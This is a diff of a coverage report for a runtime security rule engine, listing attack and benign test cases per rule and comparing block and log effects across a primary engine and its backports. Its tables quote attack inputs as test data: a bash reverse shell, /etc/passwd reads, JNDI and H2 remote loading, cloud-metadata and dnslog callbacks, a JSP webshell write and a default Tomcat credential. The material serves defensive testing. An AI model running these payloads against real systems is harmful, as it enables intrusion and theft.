@@ -18,24 +18,24 @@ One file per rule id. Effects count the file's attack cases; rules are the ids t
 
 | Case file | Attack | Benign | Primary effects | Primary rules | Backport effects | Backport rules |
 |---|---:|---:|---|---|---|---|
-| [archive_traversal](../rules/cases/archive_traversal.toml) | 2 | 1 | block 1, log 1 | `archive_traversal` | block 2 | `archive_entry_traversal_write` |
+| [archive_traversal](../rules/cases/archive_traversal.toml) | 4 | 1 | block 3, log 1 | `archive_traversal` | block 3, log 1 | `archive_entry_traversal_write` |
 | [base64_avx512_tail_underflow](../rules/cases/base64_avx512_tail_underflow.toml) | 2 | 1 | block 2 | `base64_avx512_tail_underflow` | block 2 | `base64_avx512_tail_underflow` |
-| [classloader_remote](../rules/cases/classloader_remote.toml) | 2 | 1 | block 1, log 1 | `classloader_remote` | block 2 | `classloader_remote_codebase` |
-| [command_common](../rules/cases/command_common.toml) | 4 | 2 | block 1, log 3 | `command_common` | block 4 | `command_execution_exploit_primitive` |
-| [command_dnslog](../rules/cases/command_dnslog.toml) | 2 | 1 | block 1, log 1 | `command_dnslog` | unreachable 2 | - |
-| [command_error](../rules/cases/command_error.toml) | 2 | 1 | block 1, log 1 | `command_error` | unreachable 2 | - |
+| [classloader_remote](../rules/cases/classloader_remote.toml) | 4 | 1 | block 3, log 1 | `classloader_remote` | block 3, log 1 | `classloader_remote_codebase` |
+| [command_common](../rules/cases/command_common.toml) | 6 | 2 | block 5, log 1 | `command_common` | block 5, log 1 | `command_execution_exploit_primitive` |
+| [command_dnslog](../rules/cases/command_dnslog.toml) | 2 | 1 | block 2 | `command_dnslog` | unreachable 2 | - |
+| [command_error](../rules/cases/command_error.toml) | 2 | 1 | block 2 | `command_error` | unreachable 2 | - |
 | [command_userinput](../rules/cases/command_userinput.toml) | 3 | 1 | block 1, none 2 | `command_userinput` | block 1, none 2 | `command_execution_shell_meta` |
 | [deleteFile_userinput](../rules/cases/deleteFile_userinput.toml) | 3 | 1 | block 1, none 2 | `deleteFile_userinput` | block 1, none 2 | `deleteFile_userinput` |
-| [deserialization_blacklist](../rules/cases/deserialization_blacklist.toml) | 4 | 1 | block 1, log 2, none 1 | `deserialization_blacklist` | block 3, none 1 | `deserialization_gadget_class` |
-| [deserialization_gadget](../rules/cases/deserialization_gadget.toml) | 2 | 1 | block 1, log 1 | `deserialization_gadget` | block 2 | `deserialization_gadget_class` |
+| [deserialization_blacklist](../rules/cases/deserialization_blacklist.toml) | 6 | 1 | block 4, log 1, none 1 | `deserialization_blacklist` | block 4, log 1, none 1 | `deserialization_gadget_class` |
+| [deserialization_gadget](../rules/cases/deserialization_gadget.toml) | 2 | 1 | block 2 | `deserialization_gadget` | block 2 | `deserialization_gadget_class` |
 | [directory_userinput](../rules/cases/directory_userinput.toml) | 5 | 1 | block 2, none 3 | `directory_userinput` | block 2, none 3 | `directory_userinput` |
 | [file_generated_plot_script_command](../rules/cases/file_generated_plot_script_command.toml) | 2 | 1 | unreachable 2 | - | block 2 | `file_generated_plot_script_command` |
-| [java_compile_runtime](../rules/cases/java_compile_runtime.toml) | 5 | 1 | block 4, none 1 | `java_compile_runtime` | block 5 | `java_compile_runtime_execution` |
+| [java_compile_runtime](../rules/cases/java_compile_runtime.toml) | 7 | 1 | block 6, log 1 | `java_compile_runtime` | block 6, log 1 | `java_compile_runtime_execution` |
 | [jdbc_derby_code_loading](../rules/cases/jdbc_derby_code_loading.toml) | 2 | 1 | unreachable 2 | - | block 2 | `jdbc_derby_code_loading` |
-| [jdbc_h2_init](../rules/cases/jdbc_h2_init.toml) | 2 | 1 | block 1, log 1 | `jdbc_h2_init` | block 2 | `jdbc_h2_code_execution` |
-| [jdbc_mysql_deserialization](../rules/cases/jdbc_mysql_deserialization.toml) | 3 | 1 | block 1, none 2 | `jdbc_mysql_deserialization` | block 3 | `jdbc_mysql_deserialization` |
-| [jndi_disable_all](../rules/cases/jndi_disable_all.toml) | 3 | 1 | block 1, log 2 | `jndi_disable_all` | block 3 | `jndi_remote_lookup` |
-| [readFile_unwanted](../rules/cases/readFile_unwanted.toml) | 3 | 1 | block 1, none 2 | `readFile_unwanted` | block 3 | `file_sensitive_read` |
+| [jdbc_h2_init](../rules/cases/jdbc_h2_init.toml) | 4 | 1 | block 3, log 1 | `jdbc_h2_init` | block 3, log 1 | `jdbc_h2_code_execution` |
+| [jdbc_mysql_deserialization](../rules/cases/jdbc_mysql_deserialization.toml) | 5 | 1 | block 4, log 1 | `jdbc_mysql_deserialization` | block 4, log 1 | `jdbc_mysql_deserialization` |
+| [jndi_disable_all](../rules/cases/jndi_disable_all.toml) | 5 | 1 | block 4, log 1 | `jndi_disable_all` | block 4, log 1 | `jndi_remote_lookup` |
+| [readFile_unwanted](../rules/cases/readFile_unwanted.toml) | 5 | 1 | block 4, log 1 | `readFile_unwanted` | block 4, log 1 | `file_sensitive_read` |
 | [readFile_userinput](../rules/cases/readFile_userinput.toml) | 3 | 2 | block 2, none 1 | `readFile_userinput` | block 2, none 1 | `file_sensitive_read` |
 | [request_debug_process_launch](../rules/cases/request_debug_process_launch.toml) | 2 | 1 | block 1, none 1 | `request_debug_process_launch` | block 1, none 1 | `request_debug_process_launch` |
 | [request_default_credential](../rules/cases/request_default_credential.toml) | 1 | 1 | block 1 | `request_default_credential` | unreachable 1 | - |
@@ -78,19 +78,19 @@ One file per rule id. Effects count the file's attack cases; rules are the ids t
 | [sql_h2_code_execution](../rules/cases/sql_h2_code_execution.toml) | 2 | 1 | block 2 | `sql_h2_code_execution` | unreachable 2 | - |
 | [sql_policy](../rules/cases/sql_policy.toml) | 2 | 1 | block 2 | `sql_policy` | block 2 | `sql_statement_injection` |
 | [sql_userinput](../rules/cases/sql_userinput.toml) | 2 | 1 | block 2 | `sql_userinput`, `sql_policy` | block 2 | `sql_statement_injection` |
-| [ssrf_aws](../rules/cases/ssrf_aws.toml) | 2 | 1 | block 1, log 1 | `ssrf_aws` | block 2 | `ssrf_cloud_metadata` |
-| [ssrf_common](../rules/cases/ssrf_common.toml) | 2 | 1 | block 1, log 1 | `ssrf_common` | unreachable 2 | - |
+| [ssrf_aws](../rules/cases/ssrf_aws.toml) | 4 | 1 | block 3, log 1 | `ssrf_aws` | block 3, log 1 | `ssrf_cloud_metadata` |
+| [ssrf_common](../rules/cases/ssrf_common.toml) | 2 | 1 | block 2 | `ssrf_common` | unreachable 2 | - |
 | [ssrf_obfuscate](../rules/cases/ssrf_obfuscate.toml) | 2 | 1 | block 1, log 1 | `ssrf_obfuscate` | unreachable 2 | - |
 | [ssrf_protocol](../rules/cases/ssrf_protocol.toml) | 2 | 1 | block 1, log 1 | `ssrf_protocol` | unreachable 2 | - |
 | [ssrf_userinput](../rules/cases/ssrf_userinput.toml) | 4 | 2 | block 3, none 1 | `ssrf_userinput` | block 3, none 1 | `ssrf_loopback_admin`, `ssrf_request_parameter_url` |
 | [writeFile_generated_script](../rules/cases/writeFile_generated_script.toml) | 3 | 1 | block 2, none 1 | `writeFile_generated_script` | none 2, unreachable 1 | - |
-| [writeFile_reflect](../rules/cases/writeFile_reflect.toml) | 2 | 1 | block 1, log 1 | `writeFile_reflect` | block 2 | `file_script_write` |
-| [writeFile_script](../rules/cases/writeFile_script.toml) | 3 | 1 | block 1, none 2 | `writeFile_script` | block 3 | `file_script_write` |
-| [xml_decoder_runtime](../rules/cases/xml_decoder_runtime.toml) | 2 | 1 | block 1, none 1 | `xml_decoder_runtime` | block 2 | `xml_decoder_runtime_execution` |
-| [xml_decoder_webshell](../rules/cases/xml_decoder_webshell.toml) | 2 | 1 | block 1, none 1 | `xml_decoder_webshell` | block 2 | `xml_decoder_script_file_write` |
-| [xpath_runtime](../rules/cases/xpath_runtime.toml) | 2 | 1 | block 1, log 1 | `xpath_runtime` | unreachable 2 | - |
-| [xxe_file](../rules/cases/xxe_file.toml) | 2 | 1 | block 1, log 1 | `xxe_file`, `xxe_protocol` | block 2 | `xxe_external_entity_protocol` |
-| [xxe_protocol](../rules/cases/xxe_protocol.toml) | 3 | 1 | block 1, log 2 | `xxe_protocol` | block 3 | `xxe_external_entity_protocol` |
+| [writeFile_reflect](../rules/cases/writeFile_reflect.toml) | 2 | 1 | block 2 | `writeFile_reflect` | block 2 | `file_script_write` |
+| [writeFile_script](../rules/cases/writeFile_script.toml) | 5 | 1 | block 4, log 1 | `writeFile_script` | block 4, log 1 | `file_script_write` |
+| [xml_decoder_runtime](../rules/cases/xml_decoder_runtime.toml) | 4 | 1 | block 3, log 1 | `xml_decoder_runtime` | block 3, log 1 | `xml_decoder_runtime_execution` |
+| [xml_decoder_webshell](../rules/cases/xml_decoder_webshell.toml) | 4 | 1 | block 3, log 1 | `xml_decoder_webshell`, `writeFile_script` | block 3, log 1 | `xml_decoder_script_file_write`, `file_script_write` |
+| [xpath_runtime](../rules/cases/xpath_runtime.toml) | 2 | 1 | block 2 | `xpath_runtime` | unreachable 2 | - |
+| [xxe_file](../rules/cases/xxe_file.toml) | 4 | 1 | block 3, log 1 | `xxe_protocol`, `xxe_file` | block 3, log 1 | `xxe_external_entity_protocol`, `file_sensitive_read` |
+| [xxe_protocol](../rules/cases/xxe_protocol.toml) | 3 | 1 | block 3 | `xxe_protocol` | block 3 | `xxe_external_entity_protocol` |
 
 ## Primary rule ids
 
@@ -98,22 +98,22 @@ Each id that some case names on this engine: the attack cases that name it, the 
 
 | Rule id | Attack cases | Benign cases | Declared effects | Case files |
 |---|---:|---:|---|---|
-| `archive_traversal` | 2 | 1 | block 1, log 1 | [archive_traversal](../rules/cases/archive_traversal.toml) |
+| `archive_traversal` | 4 | 1 | block 3, log 1 | [archive_traversal](../rules/cases/archive_traversal.toml) |
 | `base64_avx512_tail_underflow` | 2 | 1 | block 2 | [base64_avx512_tail_underflow](../rules/cases/base64_avx512_tail_underflow.toml) |
-| `classloader_remote` | 2 | 1 | block 1, log 1 | [classloader_remote](../rules/cases/classloader_remote.toml) |
-| `command_common` | 4 | 2 | block 1, log 3 | [command_common](../rules/cases/command_common.toml) |
-| `command_dnslog` | 2 | 1 | block 1, log 1 | [command_dnslog](../rules/cases/command_dnslog.toml) |
-| `command_error` | 2 | 1 | block 1, log 1 | [command_error](../rules/cases/command_error.toml) |
+| `classloader_remote` | 4 | 1 | block 3, log 1 | [classloader_remote](../rules/cases/classloader_remote.toml) |
+| `command_common` | 6 | 2 | block 5, log 1 | [command_common](../rules/cases/command_common.toml) |
+| `command_dnslog` | 2 | 1 | block 2 | [command_dnslog](../rules/cases/command_dnslog.toml) |
+| `command_error` | 2 | 1 | block 2 | [command_error](../rules/cases/command_error.toml) |
 | `command_userinput` | 1 | 1 | block 1 | [command_userinput](../rules/cases/command_userinput.toml) |
 | `deleteFile_userinput` | 1 | 1 | block 1 | [deleteFile_userinput](../rules/cases/deleteFile_userinput.toml) |
-| `deserialization_blacklist` | 3 | 1 | block 1, log 2 | [deserialization_blacklist](../rules/cases/deserialization_blacklist.toml) |
-| `deserialization_gadget` | 2 | 1 | block 1, log 1 | [deserialization_gadget](../rules/cases/deserialization_gadget.toml) |
+| `deserialization_blacklist` | 5 | 1 | block 4, log 1 | [deserialization_blacklist](../rules/cases/deserialization_blacklist.toml) |
+| `deserialization_gadget` | 2 | 1 | block 2 | [deserialization_gadget](../rules/cases/deserialization_gadget.toml) |
 | `directory_userinput` | 2 | 1 | block 2 | [directory_userinput](../rules/cases/directory_userinput.toml) |
-| `java_compile_runtime` | 4 | 1 | block 4 | [java_compile_runtime](../rules/cases/java_compile_runtime.toml) |
-| `jdbc_h2_init` | 2 | 1 | block 1, log 1 | [jdbc_h2_init](../rules/cases/jdbc_h2_init.toml) |
-| `jdbc_mysql_deserialization` | 1 | 1 | block 1 | [jdbc_mysql_deserialization](../rules/cases/jdbc_mysql_deserialization.toml) |
-| `jndi_disable_all` | 3 | 1 | block 1, log 2 | [jndi_disable_all](../rules/cases/jndi_disable_all.toml) |
-| `readFile_unwanted` | 1 | 1 | block 1 | [readFile_unwanted](../rules/cases/readFile_unwanted.toml) |
+| `java_compile_runtime` | 7 | 1 | block 6, log 1 | [java_compile_runtime](../rules/cases/java_compile_runtime.toml) |
+| `jdbc_h2_init` | 4 | 1 | block 3, log 1 | [jdbc_h2_init](../rules/cases/jdbc_h2_init.toml) |
+| `jdbc_mysql_deserialization` | 5 | 1 | block 4, log 1 | [jdbc_mysql_deserialization](../rules/cases/jdbc_mysql_deserialization.toml) |
+| `jndi_disable_all` | 5 | 1 | block 4, log 1 | [jndi_disable_all](../rules/cases/jndi_disable_all.toml) |
+| `readFile_unwanted` | 5 | 1 | block 4, log 1 | [readFile_unwanted](../rules/cases/readFile_unwanted.toml) |
 | `readFile_userinput` | 2 | 2 | block 2 | [readFile_userinput](../rules/cases/readFile_userinput.toml) |
 | `request_debug_process_launch` | 1 | 1 | block 1 | [request_debug_process_launch](../rules/cases/request_debug_process_launch.toml) |
 | `request_default_credential` | 1 | 1 | block 1 | [request_default_credential](../rules/cases/request_default_credential.toml) |
@@ -152,19 +152,19 @@ Each id that some case names on this engine: the attack cases that name it, the 
 | `sql_h2_code_execution` | 2 | 1 | block 2 | [sql_h2_code_execution](../rules/cases/sql_h2_code_execution.toml) |
 | `sql_policy` | 3 | 2 | block 3 | [sql_policy](../rules/cases/sql_policy.toml), [sql_userinput](../rules/cases/sql_userinput.toml) |
 | `sql_userinput` | 1 | 1 | block 1 | [sql_userinput](../rules/cases/sql_userinput.toml) |
-| `ssrf_aws` | 2 | 1 | block 1, log 1 | [ssrf_aws](../rules/cases/ssrf_aws.toml) |
-| `ssrf_common` | 2 | 1 | block 1, log 1 | [ssrf_common](../rules/cases/ssrf_common.toml) |
+| `ssrf_aws` | 4 | 1 | block 3, log 1 | [ssrf_aws](../rules/cases/ssrf_aws.toml) |
+| `ssrf_common` | 2 | 1 | block 2 | [ssrf_common](../rules/cases/ssrf_common.toml) |
 | `ssrf_obfuscate` | 2 | 1 | block 1, log 1 | [ssrf_obfuscate](../rules/cases/ssrf_obfuscate.toml) |
 | `ssrf_protocol` | 2 | 1 | block 1, log 1 | [ssrf_protocol](../rules/cases/ssrf_protocol.toml) |
 | `ssrf_userinput` | 3 | 2 | block 3 | [ssrf_userinput](../rules/cases/ssrf_userinput.toml) |
 | `writeFile_generated_script` | 2 | 1 | block 2 | [writeFile_generated_script](../rules/cases/writeFile_generated_script.toml) |
-| `writeFile_reflect` | 2 | 1 | block 1, log 1 | [writeFile_reflect](../rules/cases/writeFile_reflect.toml) |
-| `writeFile_script` | 1 | 1 | block 1 | [writeFile_script](../rules/cases/writeFile_script.toml) |
-| `xml_decoder_runtime` | 1 | 1 | block 1 | [xml_decoder_runtime](../rules/cases/xml_decoder_runtime.toml) |
-| `xml_decoder_webshell` | 1 | 1 | block 1 | [xml_decoder_webshell](../rules/cases/xml_decoder_webshell.toml) |
-| `xpath_runtime` | 2 | 1 | block 1, log 1 | [xpath_runtime](../rules/cases/xpath_runtime.toml) |
+| `writeFile_reflect` | 2 | 1 | block 2 | [writeFile_reflect](../rules/cases/writeFile_reflect.toml) |
+| `writeFile_script` | 6 | 2 | block 4, log 1, log (also) 1 | [writeFile_script](../rules/cases/writeFile_script.toml), [xml_decoder_webshell](../rules/cases/xml_decoder_webshell.toml) |
+| `xml_decoder_runtime` | 4 | 1 | block 3, log 1 | [xml_decoder_runtime](../rules/cases/xml_decoder_runtime.toml) |
+| `xml_decoder_webshell` | 4 | 1 | block 3, log 1 | [xml_decoder_webshell](../rules/cases/xml_decoder_webshell.toml) |
+| `xpath_runtime` | 2 | 1 | block 2 | [xpath_runtime](../rules/cases/xpath_runtime.toml) |
 | `xxe_file` | 1 | 1 | log 1 | [xxe_file](../rules/cases/xxe_file.toml) |
-| `xxe_protocol` | 5 | 2 | block 2, log 2, log (also) 1 | [xxe_file](../rules/cases/xxe_file.toml), [xxe_protocol](../rules/cases/xxe_protocol.toml) |
+| `xxe_protocol` | 7 | 2 | block 6, log (also) 1 | [xxe_file](../rules/cases/xxe_file.toml), [xxe_protocol](../rules/cases/xxe_protocol.toml) |
 
 Not covered on this engine, from [uncovered.toml](../rules/cases/uncovered.toml) and, for the ids marked `not wired`, from the `not_wired` object of the [catalogue](../rules/general.json):
 
@@ -208,22 +208,22 @@ Each id that some case names on this engine: the attack cases that name it, the 
 
 | Rule id | Attack cases | Benign cases | Declared effects | Case files |
 |---|---:|---:|---|---|
-| `archive_entry_traversal_write` | 2 | 1 | block 2 | [archive_traversal](../rules/cases/archive_traversal.toml) |
+| `archive_entry_traversal_write` | 4 | 1 | block 3, log 1 | [archive_traversal](../rules/cases/archive_traversal.toml) |
 | `base64_avx512_tail_underflow` | 2 | 1 | block 2 | [base64_avx512_tail_underflow](../rules/cases/base64_avx512_tail_underflow.toml) |
-| `classloader_remote_codebase` | 2 | 1 | block 2 | [classloader_remote](../rules/cases/classloader_remote.toml) |
-| `command_execution_exploit_primitive` | 4 | 2 | block 4 | [command_common](../rules/cases/command_common.toml) |
+| `classloader_remote_codebase` | 4 | 1 | block 3, log 1 | [classloader_remote](../rules/cases/classloader_remote.toml) |
+| `command_execution_exploit_primitive` | 6 | 2 | block 5, log 1 | [command_common](../rules/cases/command_common.toml) |
 | `command_execution_shell_meta` | 1 | 1 | block 1 | [command_userinput](../rules/cases/command_userinput.toml) |
 | `deleteFile_userinput` | 1 | 1 | block 1 | [deleteFile_userinput](../rules/cases/deleteFile_userinput.toml) |
-| `deserialization_gadget_class` | 5 | 2 | block 5 | [deserialization_blacklist](../rules/cases/deserialization_blacklist.toml), [deserialization_gadget](../rules/cases/deserialization_gadget.toml) |
+| `deserialization_gadget_class` | 7 | 2 | block 6, log 1 | [deserialization_blacklist](../rules/cases/deserialization_blacklist.toml), [deserialization_gadget](../rules/cases/deserialization_gadget.toml) |
 | `directory_userinput` | 2 | 1 | block 2 | [directory_userinput](../rules/cases/directory_userinput.toml) |
 | `file_generated_plot_script_command` | 2 | 1 | block 2 | [file_generated_plot_script_command](../rules/cases/file_generated_plot_script_command.toml) |
-| `file_script_write` | 5 | 2 | block 5 | [writeFile_reflect](../rules/cases/writeFile_reflect.toml), [writeFile_script](../rules/cases/writeFile_script.toml) |
-| `file_sensitive_read` | 5 | 3 | block 5 | [readFile_unwanted](../rules/cases/readFile_unwanted.toml), [readFile_userinput](../rules/cases/readFile_userinput.toml) |
-| `java_compile_runtime_execution` | 5 | 1 | block 5 | [java_compile_runtime](../rules/cases/java_compile_runtime.toml) |
+| `file_script_write` | 8 | 3 | block 6, log 1, log (also) 1 | [writeFile_reflect](../rules/cases/writeFile_reflect.toml), [writeFile_script](../rules/cases/writeFile_script.toml), [xml_decoder_webshell](../rules/cases/xml_decoder_webshell.toml) |
+| `file_sensitive_read` | 8 | 4 | block 6, log 1, log (also) 1 | [readFile_unwanted](../rules/cases/readFile_unwanted.toml), [readFile_userinput](../rules/cases/readFile_userinput.toml), [xxe_file](../rules/cases/xxe_file.toml) |
+| `java_compile_runtime_execution` | 7 | 1 | block 6, log 1 | [java_compile_runtime](../rules/cases/java_compile_runtime.toml) |
 | `jdbc_derby_code_loading` | 2 | 1 | block 2 | [jdbc_derby_code_loading](../rules/cases/jdbc_derby_code_loading.toml) |
-| `jdbc_h2_code_execution` | 2 | 1 | block 2 | [jdbc_h2_init](../rules/cases/jdbc_h2_init.toml) |
-| `jdbc_mysql_deserialization` | 3 | 1 | block 3 | [jdbc_mysql_deserialization](../rules/cases/jdbc_mysql_deserialization.toml) |
-| `jndi_remote_lookup` | 3 | 1 | block 3 | [jndi_disable_all](../rules/cases/jndi_disable_all.toml) |
+| `jdbc_h2_code_execution` | 4 | 1 | block 3, log 1 | [jdbc_h2_init](../rules/cases/jdbc_h2_init.toml) |
+| `jdbc_mysql_deserialization` | 5 | 1 | block 4, log 1 | [jdbc_mysql_deserialization](../rules/cases/jdbc_mysql_deserialization.toml) |
+| `jndi_remote_lookup` | 5 | 1 | block 4, log 1 | [jndi_disable_all](../rules/cases/jndi_disable_all.toml) |
 | `request_debug_process_launch` | 1 | 1 | block 1 | [request_debug_process_launch](../rules/cases/request_debug_process_launch.toml) |
 | `request_default_crypto_cookie` | 1 | 1 | block 1 | [request_default_crypto_cookie](../rules/cases/request_default_crypto_cookie.toml) |
 | `request_default_jwt_secret` | 1 | 1 | block 1 | [request_default_jwt_secret](../rules/cases/request_default_jwt_secret.toml) |
@@ -236,12 +236,12 @@ Each id that some case names on this engine: the attack cases that name it, the 
 | `request_template_source` | 1 | 1 | block 1 | [request_template_source](../rules/cases/request_template_source.toml) |
 | `request_typed_payload_deserialization` | 1 | 1 | block 1 | [request_typed_payload_deserialization](../rules/cases/request_typed_payload_deserialization.toml) |
 | `sql_statement_injection` | 4 | 2 | block 4 | [sql_policy](../rules/cases/sql_policy.toml), [sql_userinput](../rules/cases/sql_userinput.toml) |
-| `ssrf_cloud_metadata` | 2 | 1 | block 2 | [ssrf_aws](../rules/cases/ssrf_aws.toml) |
+| `ssrf_cloud_metadata` | 4 | 1 | block 3, log 1 | [ssrf_aws](../rules/cases/ssrf_aws.toml) |
 | `ssrf_loopback_admin` | 1 | 2 | block 1 | [ssrf_userinput](../rules/cases/ssrf_userinput.toml) |
 | `ssrf_request_parameter_url` | 2 | 2 | block 2 | [ssrf_userinput](../rules/cases/ssrf_userinput.toml) |
-| `xml_decoder_runtime_execution` | 2 | 1 | block 2 | [xml_decoder_runtime](../rules/cases/xml_decoder_runtime.toml) |
-| `xml_decoder_script_file_write` | 2 | 1 | block 2 | [xml_decoder_webshell](../rules/cases/xml_decoder_webshell.toml) |
-| `xxe_external_entity_protocol` | 5 | 2 | block 5 | [xxe_file](../rules/cases/xxe_file.toml), [xxe_protocol](../rules/cases/xxe_protocol.toml) |
+| `xml_decoder_runtime_execution` | 4 | 1 | block 3, log 1 | [xml_decoder_runtime](../rules/cases/xml_decoder_runtime.toml) |
+| `xml_decoder_script_file_write` | 4 | 1 | block 3, log 1 | [xml_decoder_webshell](../rules/cases/xml_decoder_webshell.toml) |
+| `xxe_external_entity_protocol` | 7 | 2 | block 6, log 1 | [xxe_file](../rules/cases/xxe_file.toml), [xxe_protocol](../rules/cases/xxe_protocol.toml) |
 
 Not covered on this engine, from [uncovered.toml](../rules/cases/uncovered.toml) and, for the ids marked `not wired`, from the `not_wired` object of the [catalogue](../rules/general.json):
 
@@ -268,7 +268,9 @@ Attack cases whose effect differs between the primary and the backports, grouped
 
 | Case | Path | Input | Primary | Backports | Why |
 |---|---|---|---|---|---|
+| [command_dnslog](../rules/cases/command_dnslog.toml) `callback-domain-lookup` | sink | `process.exec /nonexistent/rule-case/nslookup abc123.dnslog.cn` | block `command_dnslog` | unreachable | backport: the backports have no list of callback domains for process arguments |
 | [command_dnslog](../rules/cases/command_dnslog.toml) `callback-domain-lookup-in-request` | request-sink | `GET /app/report?id=7; process.exec /nonexistent/rule-case/nslookup abc123.dnslog.cn` | block `command_dnslog` | unreachable | backport: the backports have no list of callback domains for process arguments |
+| [command_error](../rules/cases/command_error.toml) `unclosed-quote` | sink | `process.exec sh -c echo 'unclosed` | block `command_error` | unreachable | backport: the backports do not check the quoting of a shell program |
 | [command_error](../rules/cases/command_error.toml) `unclosed-quote-in-request` | request-sink | `GET /app/report?id=7; process.exec sh -c echo 'unclosed` | block `command_error` | unreachable | backport: the backports do not check the quoting of a shell program |
 | [request_default_credential](../rules/cases/request_default_credential.toml) `tomcat-basic-default` | request | `GET /manager/html; Authorization: Basic dG9tY2F0OnRvbWNhdA==` | block `request_default_credential` | unreachable | backport: the backports have no request-entry rule for this input |
 | [request_dynamic_script_config](../rules/cases/request_dynamic_script_config.toml) `jenkins-check-script-execute` | request | `GET /securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=public%2...` | block `request_dynamic_script_config` | unreachable | backport: the backports have no request-entry rule for this input |
@@ -297,56 +299,19 @@ Attack cases whose effect differs between the primary and the backports, grouped
 | [sql_h2_code_execution](../rules/cases/sql_h2_code_execution.toml) `h2-remote-runscript-in-request` | request-sink | `GET /app/report?id=7; sql.execute RUNSCRIPT FROM 'http://127.0.0.1:1/init.sql'` | block `sql_h2_code_execution` | unreachable | backport: the backports check H2 code execution in the JDBC URL, not in SQL text |
 | [sql_h2_code_execution](../rules/cases/sql_h2_code_execution.toml) `h2-remote-runscript-outside-request` | sink | `sql.execute RUNSCRIPT FROM 'http://127.0.0.1:1/init.sql'` | block `sql_h2_code_execution` | unreachable | backport: the backports check H2 code execution in the JDBC URL, not in SQL text |
 | [ssrf_common](../rules/cases/ssrf_common.toml) `callback-domain-in-request` | request-sink | `GET /app/report?id=7; net.open http://abc123.dnslog.cn/` | block `ssrf_common` | unreachable | backport: the backports have no list of callback domains for outbound URLs |
+| [ssrf_common](../rules/cases/ssrf_common.toml) `callback-domain-outside-request` | sink | `net.open http://abc123.dnslog.cn/` | block `ssrf_common` | unreachable | backport: the backports have no list of callback domains for outbound URLs |
 | [ssrf_obfuscate](../rules/cases/ssrf_obfuscate.toml) `hex-loopback-in-request` | request-sink | `GET /app/report?id=7; net.open http://0x7f000001:{port}/` | block `ssrf_obfuscate` | unreachable | backport: the backports do not check how an outbound host is written |
 | [ssrf_protocol](../rules/cases/ssrf_protocol.toml) `ftp-url-in-request` | request-sink | `GET /app/report?id=7; net.open ftp://127.0.0.1:1/etc/passwd` | block `ssrf_protocol` | unreachable | backport: the backports check outbound HTTP destinations only, not the URL scheme |
 | [writeFile_generated_script](../rules/cases/writeFile_generated_script.toml) `request-shell-script-exec` | request-sink | `POST /app/jobs?script=%23%21%2Fbin%2Fsh%0Aexec%28%27id%27%29%0A; file.write (Files.write) {tmp}/cache/run.sh, #!/bin/sh exec('id') ` | block `writeFile_generated_script` | unreachable | backport: the backports have no generated-script rule, and their script-write rule needs a web root or a ../ in the path |
 | [xpath_runtime](../rules/cases/xpath_runtime.toml) `runtime-exec-extension-in-request` | request-sink | `GET /app/report?id=7; xpath.evaluate rt:exec(rt:getRuntime(), 'id')` | block `xpath_runtime` | unreachable | backport: the backports have no XPath expression rule |
-
-### Primary log, backports block
-
-| Case | Path | Input | Primary | Backports | Why |
-|---|---|---|---|---|---|
-| [archive_traversal](../rules/cases/archive_traversal.toml) `entry-escapes-outside-request` | sink | `archive.extract ../../evil.txt, {tmp}/extract/a/b` | log `archive_traversal` | block `archive_entry_traversal_write` | primary: the primary blocks this only inside an HTTP request; outside one it logs |
-| [classloader_remote](../rules/cases/classloader_remote.toml) `http-codebase-outside-request` | sink | `classloader.remote http://127.0.0.1:{port}/, RemoteGreeting` | log `classloader_remote` | block `classloader_remote_codebase` | primary: the primary blocks this only inside an HTTP request; outside one it logs |
-| [command_common](../rules/cases/command_common.toml) `reverse-shell-shape` | sink | `process.exec /nonexistent/rule-case/sh -c bash -i >& /dev/tcp/127.0.0.1/9 0>&1` | log `command_common` | block `command_execution_exploit_primitive` | primary: the primary blocks this only inside an HTTP request; outside one it logs |
-| [command_common](../rules/cases/command_common.toml) `runtime-exec-reads-passwd` | sink | `process.exec (Runtime.exec) sh -c cat /etc/passwd` | log `command_common` | block `command_execution_exploit_primitive` | primary: the primary blocks this only inside an HTTP request; outside one it logs |
-| [command_common](../rules/cases/command_common.toml) `shell-reads-passwd-outside-request` | sink | `process.exec sh -c cat /etc/passwd` | log `command_common` | block `command_execution_exploit_primitive` | primary: the primary blocks this only inside an HTTP request; outside one it logs |
-| [deserialization_blacklist](../rules/cases/deserialization_blacklist.toml) `jdbc-rowset` | sink | `deserialize com.sun.rowset.JdbcRowSetImpl` | log `deserialization_blacklist` | block `deserialization_gadget_class` | primary: the primary blocks this only inside an HTTP request; outside one it logs |
-| [deserialization_blacklist](../rules/cases/deserialization_blacklist.toml) `templates-impl-outside-request` | sink | `deserialize com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl` | log `deserialization_blacklist` | block `deserialization_gadget_class` | primary: the primary blocks this only inside an HTTP request; outside one it logs |
-| [deserialization_gadget](../rules/cases/deserialization_gadget.toml) `bean-comparator-outside-request` | sink | `deserialize org.apache.commons.beanutils.BeanComparator` | log `deserialization_gadget` | block `deserialization_gadget_class` | primary: the primary blocks this only inside an HTTP request; outside one it logs |
-| [jdbc_h2_init](../rules/cases/jdbc_h2_init.toml) `h2-init-runscript-outside-request` | sink | `jdbc.connect jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://127.0.0.1:{port}/init.sql'` | log `jdbc_h2_init` | block `jdbc_h2_code_execution` | primary: the primary blocks this only inside an HTTP request; outside one it logs |
-| [jndi_disable_all](../rules/cases/jndi_disable_all.toml) `ldap-lookup-outside-request` | sink | `jndi.lookup ldap://127.0.0.1:1/Exploit` | log `jndi_disable_all` | block `jndi_remote_lookup` | primary: the primary blocks this only inside an HTTP request; outside one it logs |
-| [jndi_disable_all](../rules/cases/jndi_disable_all.toml) `rmi-lookup` | sink | `jndi.lookup rmi://127.0.0.1:1/Exploit` | log `jndi_disable_all` | block `jndi_remote_lookup` | primary: the primary blocks this only inside an HTTP request; outside one it logs |
-| [ssrf_aws](../rules/cases/ssrf_aws.toml) `metadata-address-outside-request` | sink | `net.open http://169.254.169.254/latest/meta-data/` | log `ssrf_aws` | block `ssrf_cloud_metadata` | primary: the primary blocks this only inside an HTTP request; outside one it logs |
-| [writeFile_reflect](../rules/cases/writeFile_reflect.toml) `jsp-through-reflection` | sink | `file.write (reflection) {tmp}/webapps/ROOT/r.jsp, <%= 1 %>` | log `writeFile_reflect` | block `file_script_write` | primary: the primary blocks this only inside an HTTP request; outside one it logs |
